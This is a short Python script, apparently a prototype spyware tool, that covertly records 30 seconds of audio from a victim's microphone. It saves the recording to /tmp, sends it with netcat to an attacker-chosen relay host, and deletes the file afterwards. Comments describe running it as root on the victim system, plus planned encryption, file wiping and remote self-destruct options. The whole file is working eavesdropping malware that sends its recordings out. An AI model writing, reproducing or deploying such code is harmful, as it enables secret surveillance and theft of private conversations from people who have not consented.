#!/usr/bin/python3
#coding: utf-8
__version__ = "v0.1.0(prototype)"
# Note: use that with root user of the victim system.
import sounddevice as sd
from scipy.io.wavfile import write
from os import system

# compression = True
# compression_level = 9

# encryption = True
# encryption_key = ""

# erase_custom_command = "rm -f {file}" # alse u can use this other exemple "wipe -rf -S r -T 15 {file}"

# For the remote of the self-destruction feature
# use the command `sha512sum <file>` and copy the hashed value to paste into this string value
# autodestructive_hashed_key = ""


fs = 44100  # Sample rate
seconds = 30  # Duration of recording
IP_HOST, PORT_HOST = "x.x.x.x", 8080 # change this two Vars to set the destination of the outbound connection by the infected victim to your attack relay point. the connection for transmit the audio records use TCP connections.
myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
sd.wait()  # Wait until recording is finished
write('/tmp/i-have-hack-your-mic.wav', fs, myrecording)  # Save as WAV file 
system("netcat "+IP_HOST+" "+PORT_HOST+" < /tmp/i-have-hack-your-mic.wav")
system("rm -f /tmp/i-have-hack-your-mic.wav")